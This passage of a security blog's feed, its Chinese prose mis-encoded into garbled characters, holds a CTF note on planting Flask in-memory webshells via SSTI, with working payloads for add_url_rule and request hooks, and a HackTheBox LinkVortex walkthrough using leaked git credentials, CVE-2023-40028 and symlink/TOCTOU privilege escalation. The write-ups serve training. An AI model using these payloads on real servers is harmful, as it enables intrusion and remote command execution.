        <content type="html"><![CDATA[<h2 id="debugæ¨¡å¼"><a href="#debugæ¨¡å¼" class="headerlink" title="debugæ¨¡å¼"></a>debugæ¨¡å¼</h2><p>å¦‚æœç¨‹åºå¼€å¯äº†debugæ¨¡å¼ï¼Œé‚£ä¹ˆä¸€èˆ¬æ˜¯è¦è®¡ç®—pinå€¼ï¼Œè®¡ç®—å‡ºpinå€¼å°±å¾ˆç®€å•äº†ã€‚</p><h2 id="édebugæ¨¡å¼"><a href="#édebugæ¨¡å¼" class="headerlink" title="édebugæ¨¡å¼"></a>édebugæ¨¡å¼</h2><h3 id="0x01-æ—§ç‰ˆå†…å­˜é©¬"><a href="#0x01-æ—§ç‰ˆå†…å­˜é©¬" class="headerlink" title="0x01 æ—§ç‰ˆå†…å­˜é©¬"></a>0x01 æ—§ç‰ˆå†…å­˜é©¬</h3><p>ä½ç‰ˆæœ¬çš„flask(ssti)ä¸€èˆ¬å¯ä»¥ç›´æ¥ä½¿ç”¨ä»¥ä¸‹payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)</span><br></pre></td></tr></table></figure><p><strong>åŸç†</strong>:</p><p>ç¬¬ä¸€è¡Œåˆ©ç”¨url_forå‡½æ•°ä½œä¸ºå…¥å£ç‚¹è·å–äº†å½“å‰å‘½åç©ºé—´çš„__builtins__æ¨¡å—ï¼Œç„¶åè°ƒç”¨evalå‡½æ•°ã€‚<br>è¿™ä¸ªevalä¼ å…¥äº†ä¸¤ä¸ªå‚æ•°ï¼Œçœ‹ç¬¬äºŒä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],</span><br><span class="line">    &#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ä»‹ç»ä¸€ä¸‹evalçš„ç¬¬äºŒä¸ªå‚æ•°ï¼š<br>evalçš„ç¬¬äºŒä¸ªå‚æ•°å…è®¸ä¼ å…¥ä¸€ä¸ªå­—å…¸ï¼Œä¸€èˆ¬æ˜¯ç”¨æ¥æŒ‡å®šè¡¨è¾¾å¼æ‰§è¡Œçš„<strong>å…¨å±€å˜é‡å‘½åç©ºé—´ï¼ˆglobalsï¼‰</strong><br>æ¥ä¸‹æ¥å†å»ç†è§£ç¬¬äºŒä¸ªå‚æ•°ä¸­ä¼ å…¥çš„å€¼å°±å¾ˆå¥½äº†ã€‚<br><code>_request_ctx_stack</code>æ˜¯ä¸€ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡æ ˆã€‚è¯·æ±‚ä¸Šä¸‹æ–‡æ˜¯æŒ‡åœ¨å¤„ç†HTTPè¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼ŒFlaskåˆ›å»ºçš„ä¸€ä¸ªä¸´æ—¶ç¯å¢ƒï¼Œç”¨æ¥å­˜å‚¨å’Œç®¡ç†ä¸å½“å‰è¯·æ±‚ç›¸å…³çš„ä¿¡æ¯<br><code>url_for.__globals__[&#39;current_app&#39;]</code>æ˜¯å½“å‰è¿è¡Œçš„appã€‚<br>ç„¶åçœ‹ä¸€ä¸‹æ‰§è¡Œçš„ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;app.add_url_rule(</span><br><span class="line">        &#x27;/shell&#x27;, </span><br><span class="line">        &#x27;shell&#x27;, </span><br><span class="line">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span><br></pre></td></tr></table></figure><p>app.add_url_rule()æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨æ¥åŠ¨æ€çš„æ·»åŠ è·¯ç”±çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•åŠ¨æ€çš„æ·»åŠ ä¸€ä¸ªè·¯ç”±ï¼Œå…¶ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡åŒ¿åå‡½æ•°æ¥å¤„ç†è¿™ä¸ªè·¯ç”±çš„è¯·æ±‚ã€‚<br>ä¸ºäº†è·å–æˆ‘ä»¬æ³¨å…¥çš„å‘½ä»¤ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å½“å‰HTTPè¯·æ±‚çš„requestå¯¹è±¡ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹è¦è·å–<code>_request_ctx_stack</code>çš„åŸå› ã€‚åœ¨è¿™ä¸ªæ ˆé‡Œï¼Œæ ˆé¡¶å…ƒç´ _request_ctx_stack.topè‡ªç„¶å°±æ˜¯æˆ‘ä»¬å½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…å«requestå¯¹è±¡ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥è·å–å½“å‰è¯·æ±‚GETä¼ å‚çš„å€¼ï¼Œè¿›è€Œæ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„å‘½ä»¤ã€‚</p><h3 id="0x02-æ–°ç‰ˆå†…å­˜é©¬"><a href="#0x02-æ–°ç‰ˆå†…å­˜é©¬" class="headerlink" title="0x02 æ–°ç‰ˆå†…å­˜é©¬"></a>0x02 æ–°ç‰ˆå†…å­˜é©¬</h3><p>æ¯”è¾ƒæ–°çš„flaskç‰ˆæœ¬ï¼Œä¸å…è®¸æˆ‘ä»¬åœ¨è¿è¡Œappçš„æ—¶å€™è°ƒç”¨å®ƒçš„add_url_ruleå‡½æ•°ã€‚<br>åœ¨é˜…è¯»äº†å¤§ä½¬ä»¬å†™çš„æ–‡ç« åï¼Œæˆ‘å¾—çŸ¥äº†å¯ä»¥ä½¿ç”¨flaskè‡ªå¸¦çš„é’©å­å‡½æ•°ï¼Œæ¥è¾¾åˆ°æ³¨å…¥å†…å­˜é©¬çš„ç›®çš„ã€‚</p><p><strong>before_request</strong></p><p>before_request()æ˜¯Flaskä¸‹çš„ä¸€ä¸ªè§£é‡Šå™¨ï¼ŒæœåŠ¡ç«¯åœ¨å¤„ç†è¯·æ±‚ä¹‹å‰ä¼šè°ƒç”¨before_requestæ‰€è®¾ç½®çš„å›è°ƒå‡½æ•°å¯¹è¯·æ±‚è¿›è¡Œé¢„å¤„ç†ï¼Œæ¯”å¦‚è¯´ï¼Œèº«ä»½éªŒè¯ã€æƒé™æ£€æŸ¥ç­‰ã€‚<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨app.before_request_funcs.setdefault()å‡½æ•°æ¥ä¸ºæˆ‘ä»¬çš„before_requestè®¾ç½®å¤„ç†å‡½æ•°ï¼Œåœ¨SSTIçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬éœ€è¦è·å–åˆ°evalå‡½æ•°æˆ–è€…execå‡½æ•°æ¥æ’å…¥å†…å­˜é©¬ã€‚<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())</span><br></pre></td></tr></table></figure><p>è·Ÿæ—§ç‰ˆçš„ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè·å–ä¸Šä¸‹æ–‡ã€‚<br>å› æ­¤åœ¨evalæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()),&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åŸå†…å®¹ä¼šè¢«before_requestçš„è¿”å›å†…å®¹è¦†ç›–ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨after_requestè§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p><strong>after_request</strong></p><p>å…ˆçœ‹ä»¥ä¸‹å‡½æ•°ä»‹ç»ï¼š<br><img src="https://raw.githubusercontent.com/Thr2on1/BlogImages/main/img/Pasted%20image%2020250417093253.png" alt="Pasted image 20250417093253"><br>è¿™ä¸ªè§£é‡Šå™¨è¦æ±‚æˆ‘ä»¬æ¥æ”¶ä¸€ä¸ªresponseå¯¹è±¡ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªresponseå¯¹è±¡ã€‚å› æ­¤æˆ‘ä»¬åœ¨å®šä¹‰åŒ¿åå‡½æ•°çš„æ—¶å€™éœ€è¦è®¾ç½®ä¸€ä¸ªå‚æ•°(é»˜è®¤ä¸ºresposeç±»å‹)<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(None,[]).append(lambda resp: make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()) if request.args.get(&#x27;cmd&#x27;) else resp)</span><br></pre></td></tr></table></figure><p>SSTIä¸­ç”¨æ³•è·Ÿbefore_requestä¸€æ ·ã€‚</p><p><strong>teardown_request</strong></p><p>è·Ÿafter_requestç”¨æ³•ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ã€‚</p><p><strong>errorhandler</strong></p><p>errorhandlerè£…é¥°å™¨å…è®¸æˆ‘ä»¬è‡ªå®šä¹‰æŠ¥é”™ç•Œé¢<br>æ¯”å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(404)</span><br><span class="line">def error():</span><br><span class="line">return &quot;404!!!&quot;</span><br></pre></td></tr></table></figure><p>é€šè¿‡errorhandlerç»‘å®šä¸€ä¸ªé’©å­å‡½æ•°ï¼Œç„¶åHTTPçŠ¶æ€ç ä¸º404æ—¶å°±è°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŠ ä»¥åˆ©ç”¨ã€‚<br>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;)</span><br></pre></td></tr></table></figure><p>è¦ç”¨execæ‰§è¡Œå‘½ä»¤ï¼Œevalä¸æ”¯æŒæ‰§è¡Œå¤šæ¡pythonå‘½ä»¤ã€‚</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">æ–°ç‰ˆFLASKä¸‹pythonå†…å­˜é©¬çš„ç ”ç©¶ - gxngxngxn - åšå®¢å›­</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Linkvortex</title>
      <link href="/2025/04/23/HTB-Linkvortex/"/>
      <url>/2025/04/23/HTB-Linkvortex/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>å¼€å¯é¶æœºå…ˆä½¿ç”¨nmapæ‰«æä¸€ä¸‹ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate 10000 10.10.11.47</span><br></pre></td></tr></table></figure><p><img src="Pasted%20image%2020250423184059.png" alt="Pasted image 20250423184059"><br>å‘ç°å¼€æ”¾äº†ä¸¤ä¸ªtcpç«¯å£<br>æ‰«ä¸€ä¸‹æœåŠ¡ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80 -sV -sC -O 10.10.11.47</span><br></pre></td></tr></table></figure><p><img src="Pasted%20image%2020250423184509.png" alt="Pasted image 20250423184509"><br>è¿™é‡Œä¹Ÿæ˜¯æ‰«åˆ°ä¸€ä¸ªç½‘ç«™ç”¨çš„æ˜¯ghost cmsæ­å»ºçš„åšå®¢<br>ç½‘ä¸Šæœç´¢ä¸€ç•ªï¼Œå‘ç°åªæœ‰åå°çš„æ¼æ´ï¼Œæ‰€ä»¥å…ˆæƒ³åŠæ³•è¿›åå°ã€‚<br>å…ˆçˆ†ç ´ä¸€ä¸‹ç›®å½•ï¼Œæ²¡æœ‰å‘ç°æœ‰ç”¨çš„ä¿¡æ¯ï¼Œç»“åˆnmapæ‰«æçš„ç»“æœï¼Œæœ‰ä¸ª&#x2F;ghost&#x2F;ç›®å½•ï¼Œæ˜¯é»˜è®¤çš„åå°è·¯å¾„ã€‚</p><h2 id="Subdomain"><a href="#Subdomain" class="headerlink" title="Subdomain"></a>Subdomain</h2><p>è¿™é‡Œå†çˆ†ç ´ä¸€ä¸‹å­åŸŸå</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://10.10.11.47 -H &quot;Host: FUZZ.linkvortex.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac</span><br></pre></td></tr></table></figure><ul><li><p>u æŒ‡å®šurl</p></li><li><p>H è‡ªå®šä¹‰HTTP Header</p></li><li><p>w æŒ‡å®šå­—å…¸</p></li><li><p>ac è‡ªåŠ¨æ ¡å‡†æ¨¡å¼ï¼šé€šè¿‡æ™ºèƒ½è¯†åˆ«ç›®æ ‡åº”ç”¨çš„æ­£å¸¸å“åº”è¡Œä¸ºï¼Œè‡ªåŠ¨æ’é™¤ä¸æ­£å¸¸å“åº”ç±»ä¼¼çš„â€œæ— æ•ˆâ€ç»“æœï¼Œä»è€Œæé«˜æ‰«æç»“æœçš„å‡†ç¡®æ€§ã€‚<br><img src="Pasted%20image%2020250423185749.png" alt="Pasted image 20250423185749"><br>çˆ†ç ´ç»“æŸï¼Œå‘ç°ä¸€ä¸ªdevçš„å­åŸŸåã€‚<br>å°†10.10.11.47    dev.linkvortex.htbåŠ å…¥åˆ°hostsæ–‡ä»¶ä¸­<br>ç”¨dirsearchæ‰«æä¸€ä¸‹è·¯å¾„ã€‚<br><img src="Pasted%20image%2020250423185923.png" alt="Pasted image 20250423185923"></p></li></ul><h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>è¿™é‡Œæ‰«åˆ°æœ‰gitæ³„éœ²ï¼Œç”¨git_dumperè„šæœ¬è·‘ä¸€ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 git_dumper.py http://dev.linkvortex.htb/.git repo</span><br></pre></td></tr></table></figure><p><img src="Pasted%20image%2020250423190115.png" alt="Pasted image 20250423190115"><br>çˆ¬åˆ°å…³é”®æºç ã€‚<br><code>git status</code>æŸ¥çœ‹ä¸€ä¸‹gitä»“åº“çš„çŠ¶æ€ï¼š<br>ä½¿ç”¨<code>git status</code>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ·»åŠ å’Œä¿®æ”¹æ–‡ä»¶çš„çŠ¶æ€ã€‚<br><img src="Pasted%20image%2020250423192619.png" alt="Pasted image 20250423192619"><br>å¯ä»¥çœ‹åˆ°æ–°åˆ›å»ºäº†ä¸€ä¸ªDockerfile.ghostï¼Œé‡Œé¢å¯èƒ½ä¿å­˜äº†ä¸€äº›é…ç½®ä¿¡æ¯ã€‚<br><img src="Pasted%20image%2020250423192754.png" alt="Pasted image 20250423192754"><br>è¿™é‡Œå¯ä»¥çœ‹åˆ°æ‹·è´äº†ä¸€ä»½configæ–‡ä»¶åˆ°&#x2F;var&#x2F;lib&#x2F;ghost&#x2F;config.production.json<br>æˆ‘ä»¬ä½¿ç”¨<code>git diff --cached</code>æŸ¥çœ‹æš‚å­˜åŒºä¸æœ€åä¸€æ¬¡æäº¤ä¹‹é—´çš„å·®å¼‚ã€‚<br><img src="Pasted%20image%2020250423215254.png" alt="Pasted image 20250423215254"><br>çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªé…·ä¼¼å¯†ç çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°è¯•ç™»é™†ä¸€ä¸‹ã€‚<br>æˆ‘ä»¬ä½¿ç”¨ <code>admin@linkvortex.htb\OctopiFociPilfer45</code>ç™»é™†åˆ°äº†åå°<br>åœ¨ç½‘ä¸Šæœç´¢ä¸€ä¸‹ghostçš„æ¼æ´ã€‚<br><img src="Pasted%20image%2020250423215557.png" alt="Pasted image 20250423215557"><br>å‘ç°æœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´ï¼Œç»“åˆè¿˜å¼€æ”¾äº†22ç«¯å£ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ç”¨æˆ·ç™»é™†è¿›å»ã€‚<br>ä¸‹è½½POCï¼Œå…ˆå°è¯•è¯»å–ä¸€ä¸‹&#x2F;etc&#x2F;passwd<br><img src="Pasted%20image%2020250423220002.png" alt="Pasted image 20250423220002"><br>è¿™é‡Œæœ‰ä¸ªnodeç”¨æˆ·ï¼Œä½†æ˜¯æˆ‘å°è¯•äº†å¾ˆå¤šæ–¹æ³•éƒ½æ²¡æœ‰ç™»é™†ä¸Šå»ï¼Œä¹‹å‰è¿˜æœ‰ä¸€ä¸ªconfigæ–‡ä»¶ï¼Œä¹Ÿå°è¯•è¯»å–ä¸€ä¸‹<br><img src="Pasted%20image%2020250423220125.png" alt="Pasted image 20250423220125"><br>è¿™é‡Œè¯»å–åˆ°ä¸€ä¸ªç”¨æˆ·å’Œå¯†ç ï¼Œå°è¯•ç™»é™†ä¸€ä¸‹ã€‚<br><img src="Pasted%20image%2020250423220255.png" alt="Pasted image 20250423220255"><br>æˆåŠŸç™»é™†</p><h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><p>å…ˆ<code>sudo -l</code>æŸ¥çœ‹ä¸€ä¸‹é…ç½®ä¿¡æ¯<br><img src="Pasted%20image%2020250423220452.png" alt="Pasted image 20250423220452"><br>![Pasted image 20250423220604](Pasted image 20250423220604.png)<br>&#x2F;etc&#x2F;sudoers å…è®¸æˆ‘ä»¬ä»¥rootæƒé™æ‰§è¡Œè¯¥å‘½ä»¤ï¼ŒæŸ¥çœ‹ä¸€ä¸‹&#x2F;opt&#x2F;ghost&#x2F;clean_symlink.shçš„é€»è¾‘ï¼š<br><img src="Pasted%20image%2020250423224659.png" alt="Pasted image 20250423224659"><br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè„šæœ¬æ¥å®ç°ææƒã€‚</p><h2 id="clean-symlink-shææƒ"><a href="#clean-symlink-shææƒ" class="headerlink" title="clean_symlink.shææƒ"></a>clean_symlink.shææƒ</h2><h3 id="0x01-Double-Symlinks"><a href="#0x01-Double-Symlinks" class="headerlink" title="0x01 Double Symlinks"></a>0x01 Double Symlinks</h3><p>Double Symlinksé¡¾åæ€ä¹‰å°±æ˜¯åµŒå¥—ä¸¤å±‚ç¬¦å·è¿æ¥<br>a.png -&gt; b -&gt; &#x2F;root&#x2F;root.txt(ç†è®ºä¸Šæ¥è¯´å¯ä»¥æ˜¯ä»»ä½•æ–‡ä»¶)</p><p>åœ¨åˆ©ç”¨è¿™ä¸ªæ¼æ´ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹Linux ä¸‹ç¬¦å·è¿æ¥çš„è¿½è¸ªé—®é¢˜ï¼š<br>å½“ç³»ç»Ÿæ‰“å¼€äº†Protected Symlinksæ¨¡å¼ï¼Œåˆ™ä¼šå¯¹ç¬¦å·è¿æ¥çš„è®¿é—®äº§ç”Ÿä¸€äº›é™åˆ¶ï¼š<br>ä½¿ç”¨å‘½ä»¤<code>sysctl fs.protected_symlinks</code>æ¥æ£€æŸ¥æ˜¯å¦å¼€å¯ï¼ŒUbuntué»˜è®¤æ˜¯å¼€å¯çš„ã€‚<br>åªæœ‰æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ä¹‹ä¸€æ—¶ï¼Œç¬¦å·é“¾æ¥æ‰èƒ½è¢«æ­£å¸¸è·Ÿéšï¼ˆå³è®¿é—®å…¶æŒ‡å‘çš„ç›®æ ‡æ–‡ä»¶ï¼‰</p><ol><li>ç¬¦å·é“¾æ¥ä½äºé[<strong>ç²˜æ» + å…¨å±€å¯å†™</strong>]çš„ç›®å½•å¤–<br>  å…¨å±€å¯å†™ï¼Œé¡¾åæ€ä¹‰æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œä¾‹å¦‚&#x2F;tmpç›®å½•ç­‰ã€‚ã€<br>  ç²˜æ»ï¼Œç›®å½•çš„stickyä½(t)è¡¨ç¤ºè¿™ä¸ªç›®å½•é‡Œçš„æ–‡ä»¶åªèƒ½è¢«ownerå’Œrootåˆ é™¤ï¼Œä¾‹å¦‚ï¼š<img src="Pasted%20image%2020250424000233.png" alt="Pasted image 20250424000233"></li><li>ç¬¦å·é“¾æ¥çš„æ‹¥æœ‰è€…ä¸è®¿é—®è€… UID ç›¸åŒ</li><li>ç¬¦å·é“¾æ¥æ‰€åœ¨ç›®å½•çš„æ‰€æœ‰è€…ä¸ç¬¦å·é“¾æ¥çš„æ‹¥æœ‰è€…ç›¸åŒ<br>è¿™é‡Œæˆ‘ä»¬ç›´æ¥åœ¨bobç”¨æˆ·æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥bæŒ‡å‘&#x2F;root&#x2F;root.txt<br>ç„¶ååˆ›å»ºä¸€ä¸ªa.pngæŒ‡å‘&#x2F;home&#x2F;bob&#x2F;b(ä¸€å®šè¦ç”¨ç»å¯¹è·¯å¾„)<br>ç„¶åè°ƒç”¨è„šæœ¬å³å¯ã€‚</li></ol><h3 id="0x02-TOCTOU-time-of-check-time-of-use"><a href="#0x02-TOCTOU-time-of-check-time-of-use" class="headerlink" title="0x02 TOCTOU(time of check time of use)"></a>0x02 TOCTOU(time of check time of use)</h3><p>è¿™æ˜¯ä¸€ä¸ªæ¡ä»¶ç«äº‰æ¼æ´ã€‚<br>å½“ä¸€ä¸ªç¨‹åºåœ¨è¯»å–ä¸€ä¸ªæ–‡ä»¶(æ‰§è¡Œä¸€é¡¹åŠŸèƒ½æ—¶)ï¼Œå¾€å¾€ä¼šå…ˆå¯¹æ–‡ä»¶çš„æƒé™æˆ–è€…ç±»å‹è¿›è¡Œæ£€æŸ¥(check)ï¼Œåœ¨æ£€æŸ¥å®Œåï¼Œå¦‚æœåˆæ ¼å°±ä¼šè¿›å…¥ä¸‹ä¸€æ­¥(è¯»å–æ–‡ä»¶å†…å®¹æˆ–è€…æ‰§è¡Œå‘½ä»¤ç­‰)ï¼Œå¦‚æœæˆ‘ä»¬åœ¨checkåï¼Œuseä¹‹å‰å°†ç›®æ ‡æ–‡ä»¶æ›¿æ¢äº†ï¼Œé‚£ä¹ˆæœ€åè¯»å–æ–‡ä»¶çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬å¸Œæœ›è·å–çš„å†…å®¹ã€‚</p><p>åœ¨è¿™é“é¢˜ç›®ä¸­ï¼Œå®ƒä¼šå…ˆæ£€æŸ¥ä¸€ä¸ªç¬¦å·é“¾æ¥æ˜¯å¦æŒ‡å‘&#x2F;rootï¼Œ&#x2F;etcç­‰æ•æ„Ÿç›®å½•ï¼Œæˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªæ™®é€šçš„é“¾æ¥æ–‡ä»¶use.pngï¼Œå½“æ£€æŸ¥é€šè¿‡åï¼Œä¼šå°†use.pngæ”¾å…¥éš”ç¦»åŒº&#x2F;var&#x2F;quarantinedç›®å½•ä¸‹ï¼Œå¦‚æœCHECK_CONTENT&#x3D;trueçš„è¯è¿˜ä¼šè¯»å–æ–‡ä»¶å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å°†use.pngæ”¾å…¥éš”ç¦»åŒºä¸è¿›è¡Œæ–‡ä»¶è¯»å–ä¹‹å‰ï¼Œè®©éš”ç¦»åŒºä¸­çš„use.pngæŒ‡å‘&#x2F;root&#x2F;root.txtï¼Œè¿™æ ·å°±å¯ä»¥æˆåŠŸè¯»å–æ–‡ä»¶(å½“ç„¶ä¹Ÿå¯ä»¥è¯»å–rootç”¨æˆ·çš„ssh_rsa)</p><h3 id="0x03-CHECK-CONTENT"><a href="#0x03-CHECK-CONTENT" class="headerlink" title="0x03 $CHECK_CONTENT"></a>0x03 $CHECK_CONTENT</h3><p>ç”±äºè„šæœ¬ä¸­æœ‰ if $CHECK_CONTENT; è¿›è¡Œåˆ¤æ–­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¾ç½®CHECK_CONTENTå˜é‡ä¸ºæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œçš„å‘½ä»¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> CVE-2023-40028 </tag>
            
            <tag> TOCTOU </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
